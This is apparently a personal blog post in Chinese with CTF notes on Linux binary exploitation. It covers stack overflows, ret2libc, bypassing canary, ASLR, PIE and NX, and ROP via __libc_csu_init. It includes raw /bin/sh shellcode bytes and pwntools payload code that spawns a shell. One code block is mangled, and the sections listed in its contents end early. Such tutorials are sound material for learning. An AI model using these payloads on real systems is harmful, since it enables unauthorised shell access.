<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"szy0127.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="pwn对方给你远程执行一个程序 你需要控制对方计算机  发现漏洞 更改控制流 找执行system(“&#x2F;bin&#x2F;sh”)的方式   file 看文件类型 32还是64 用ida看反编译 checksec 看保护 objdump -d file &gt; asm.txt 看汇编  环境skysider&#x2F;pwndocker: A docker environment for">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn">
<meta property="og:url" content="http://szy0127.github.io/2024/01/22/ctf/pwn/index.html">
<meta property="og:site_name" content="S blog">
<meta property="og:description" content="pwn对方给你远程执行一个程序 你需要控制对方计算机  发现漏洞 更改控制流 找执行system(“&#x2F;bin&#x2F;sh”)的方式   file 看文件类型 32还是64 用ida看反编译 checksec 看保护 objdump -d file &gt; asm.txt 看汇编  环境skysider&#x2F;pwndocker: A docker environment for">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-01-22T12:29:20.999Z">
<meta property="article:modified_time" content="2024-01-22T12:29:21.453Z">
<meta property="article:author" content="szy">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://szy0127.github.io/2024/01/22/ctf/pwn/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://szy0127.github.io/2024/01/22/ctf/pwn/","path":"2024/01/22/ctf/pwn/","title":"pwn"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>pwn | S blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">S blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA-stackoverflow"><span class="nav-number">1.2.</span> <span class="nav-text">栈溢出(stackoverflow)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">phase 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-2"><span class="nav-number">1.2.2.</span> <span class="nav-text">phase 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-3"><span class="nav-number">1.2.3.</span> <span class="nav-text">phase 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-4"><span class="nav-number">1.2.4.</span> <span class="nav-text">phase 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-5-%E4%BF%9D%E6%8A%A4%E5%85%A8%E5%BC%80"><span class="nav-number">1.2.5.</span> <span class="nav-text">phase 5 (保护全开)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87canary"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">绕过canary</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87ASLR-PIE"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">绕过ASLR PIE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87NX-%EF%BC%88ROP%EF%BC%89"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">绕过NX （ROP）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-format-string"><span class="nav-number">1.3.</span> <span class="nav-text">格式化字符串(format string)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-number">1.3.1.</span> <span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%9C%B0%E5%9D%80"><span class="nav-number">1.3.2.</span> <span class="nav-text">修改地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">1.4.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ida"><span class="nav-number">1.4.1.</span> <span class="nav-text">ida</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools"><span class="nav-number">1.4.2.</span> <span class="nav-text">pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwngdb"><span class="nav-number">1.4.3.</span> <span class="nav-text">pwngdb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROPgadget"><span class="nav-number">1.4.4.</span> <span class="nav-text">ROPgadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-number">1.4.5.</span> <span class="nav-text">checksec</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="nav-number">1.5.</span> <span class="nav-text">注意点</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">szy</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/ctf/pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="pwn | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pwn
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:29:20 / Modified: 20:29:21" itemprop="dateCreated datePublished" datetime="2024-01-22T20:29:20+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>7.9k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>29 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>对方给你远程执行一个程序 你需要控制对方计算机</p>
<ol>
<li>发现漏洞 更改控制流</li>
<li>找执行system(“&#x2F;bin&#x2F;sh”)的方式</li>
</ol>
<ul>
<li>file 看文件类型 32还是64</li>
<li>用ida看反编译</li>
<li>checksec 看保护</li>
<li>objdump -d file &gt; asm.txt 看汇编</li>
</ul>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a target="_blank" rel="noopener" href="https://github.com/skysider/pwndocker">skysider&#x2F;pwndocker: A docker environment for pwn in ctf (github.com)</a></p>
<p>gdb pwntools</p>
<p>如果运行二进制报libc版本的错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<ul>
<li>添加高版本的源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://th.archive.ubuntu.com/ubuntu jammy main    #添加该行到文件</span><br></pre></td></tr></table></figure>

<ul>
<li>运行升级</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install libc6</span><br></pre></td></tr></table></figure>



<h2 id="栈溢出-stackoverflow"><a href="#栈溢出-stackoverflow" class="headerlink" title="栈溢出(stackoverflow)"></a>栈溢出(stackoverflow)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[size];</span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure>

<p>gets不限制长度 read长度不匹配</p>
<p>汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov esp,ebp</span><br><span class="line">sub esp,size</span><br><span class="line">...</span><br><span class="line">call gets</span><br><span class="line">add esp,size</span><br><span class="line">...</span><br><span class="line">leave  (mov ebp,esp  /  pop ebp)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>32位：覆盖size+4</p>
<ul>
<li><p>system(‘bin&#x2F;sh’) 或 execve(‘bin&#x2F;sh’,0,0) 都可以  </p>
</li>
<li><p>system有时候要求栈16地址对齐  但有时候满足了还是会出错</p>
</li>
<li><p>execve二 三个参数不设置可能也可以 （看运气）</p>
</li>
<li><p>本地调试的环境和libc会和远程有差异</p>
</li>
</ul>
<h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>程序中存在system(“&#x2F;bin&#x2F;sh”)函数 直接把这个函数的地址覆盖至栈上的retaddr</p>
<h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><p>程序中不存在system函数 在栈上写shellcode  把栈的起始地址覆盖至栈上的retaddr 执行shellcode</p>
<p><code>b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</code></p>
<h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>栈地址随机化 只能把shellcode写到另一块地方(确定的地址) 然后更改执行流至这个确定的地址</p>
<p>这个地址必须是可以写入数据的  text段不允许写入数据  data段可以</p>
<p><code>readelf -S findshellcode</code>可以查看 (栈地址随机化 text段和data段地址确定)</p>
<p>利用两次read</p>
<ul>
<li><p>第一次 ：栈溢出 布置栈</p>
<p><code>pad + p32(read_addr) + p32(shellcode_addr)+p32(0)+p32(shellcode_addr)+p32(0x80)</code></p>
<p>最后三个是read的参数 分别是stdin 写入地址 写入字节数</p>
</li>
<li><p>第二次：发送shellcode（加\x00中止）</p>
</li>
</ul>
<p>int 80 软中断原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaominthere/article/details/17287965">Linux系统调用 int 80h int 0x80_xiaominthere的专栏-CSDN博客</a></p>
<h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h3><p>程序中不存在system函数 栈不可执行 利用libc里的system函数和&#x2F;bin&#x2F;sh字符串</p>
<p>plt 局部 别人写的库 你程序里用到了  你程序里会有一个这个函数的地址 不是真实的 会直接跳到got中</p>
<p>got 全局 但是记录的是偏移</p>
<p>真实地址 &#x3D; 基地址 + 偏移地址  </p>
<p>目标：拿到基地址与偏移地址 计算system与”&#x2F;bin&#x2F;sh”的真实地址</p>
<ul>
<li><p>偏移地址：可由一个确定版本的libc库决定 （本地调试的时候会使用本地环境的libc导致问题）</p>
<ul>
<li><p>题目给了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">    func_offset = libc.symbols[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">    str_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">  - 题目没给</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    ```python</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;func&#x27;</span>,func_addr)<span class="comment">#泄露的真实地址</span></span><br><span class="line">    func_offset = libc.dump(<span class="string">&#x27;func&#x27;</span>)</span><br><span class="line">    str_offset = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">- 基地址 = 真实地址 - 偏移地址  </span><br><span class="line"></span><br><span class="line">  `elf = ELF(<span class="string">&#x27;./elf&#x27;</span>)`</span><br><span class="line"></span><br><span class="line">  - 需要一个在漏洞前已经执行过的函数(__libc_start_main  puts) 拿到它的真实地址</span><br><span class="line"></span><br><span class="line">    `puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]`</span><br><span class="line"></span><br><span class="line">  - 需要puts/write或其他输出的函数 把真实地址传过来</span><br><span class="line"></span><br><span class="line">    `puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]`</span><br><span class="line"></span><br><span class="line">  - 需要一个可以二次利用栈溢出的地址</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    main = <span class="number">0x123456</span><span class="comment">#真实地址</span></span><br><span class="line">    main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据call的参数对寄存器或栈的要求 布置好内容</p>
<p><code>payload1 = pad + p32(puts_plt) + p32(main) + p32(puts_got)</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u32(p.recv()[:4])</span><br><span class="line">base_addr = puts_addr - puts_offset</span><br></pre></td></tr></table></figure></li>
</ul>
<p>最后根据地址布置好栈 调用</p>
<p><code>payload2 = pad + p32(system_addr) + pad4 + p32(binsh_addr)</code></p>
<p>pad4是调用system的时候push进去的retaddr binsh_addr是第一个参数</p>
<h3 id="phase-5-保护全开"><a href="#phase-5-保护全开" class="headerlink" title="phase 5 (保护全开)"></a>phase 5 (保护全开)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rsp--&gt;  buf</span><br><span class="line">...</span><br><span class="line">rbp-8--&gt;  canary</span><br><span class="line">rbp  --&gt;  saved rbp</span><br><span class="line">rbp+8 --&gt; retaddr</span><br></pre></td></tr></table></figure>

<h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>canary为了防止被输出 最低位通常为0x0，用于截断字符串</p>
<p>栈溢出时覆盖一位即可，可以拿到canary及其他数据</p>
<h4 id="绕过ASLR-PIE"><a href="#绕过ASLR-PIE" class="headerlink" title="绕过ASLR PIE"></a>绕过ASLR PIE</h4><p>所有地址都是随机的，但是可以通过泄露的方式拿到</p>
<ul>
<li>泄露saved rbp 拿到stack地址</li>
<li>泄露retaddr 拿到text地址</li>
<li>main函数的retaddr里存放了__libc_start_main+243</li>
</ul>
<p>低12位不会被随机 可以用 <code>addr_leak &gt;&gt; 12 &lt;&lt; 12 | (addr &amp; 0xfff)</code>的方式配合ida获得任意地址</p>
<p>或者直接partial write 只覆盖低12位</p>
<h4 id="绕过NX-（ROP）"><a href="#绕过NX-（ROP）" class="headerlink" title="绕过NX （ROP）"></a>绕过NX （ROP）</h4><p><code>ROPgadget --binary rop_x64</code> 展示所有的gadgets</p>
<p>栈不可执行，或栈地址随机化 </p>
<p>只能执行其他确定地址上的任意代码，可以根据一些gadget配合栈的布置构造函数的调用</p>
<p>以_libc_csu_init  64bit为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<p>可以通过如下方法执行任意函数并给三个参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15,addr</span>):</span><br><span class="line">    <span class="comment"># rdi = r15, rsi = r14, rdx = r13</span></span><br><span class="line">    <span class="comment"># r12 = addr of function want to call</span></span><br><span class="line">    <span class="comment"># rbx should be 0 and rbp should be 1</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * pad + p64(fake_ebp)</span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(csu_part2_addr) </span><br><span class="line">    <span class="comment">#pop rbx rbp r12 r13 r14 r15</span></span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(csu_part1_addr)</span><br><span class="line">    <span class="comment">#mov rdx rsi edi</span></span><br><span class="line">    <span class="comment">#call *r12</span></span><br><span class="line">    <span class="comment">#add rsp ,8  pop .......</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span>* <span class="number">56</span></span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">addr,arg1,arg2,arg3,ret_addr</span>):</span><br><span class="line">    payload = csu(<span class="number">0</span>,<span class="number">1</span>,addr,arg3,arg2,arg1,ret_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>第一次利用：write 泄露地址，拿到libc基址</p>
<p>第二次利用：read bss段写入system地址</p>
<p>第三次利用：read bss段写入&#x2F;bin&#x2F;sh 或&#x2F;bin&#x2F;bash</p>
<p>第四次利用：执行bss段记录的system函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">call(puts_got,puts_got,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">7</span>)[:<span class="number">6</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">call(gets_got,bss_base+<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line"><span class="comment"># sendline send matters</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">call(gets_got,bss_base+<span class="number">0x200</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line">p.sendline(p64(system_addr))</span><br><span class="line">call(bss_base+<span class="number">0x200</span>,bss_base+<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br></pre></td></tr></table></figure>



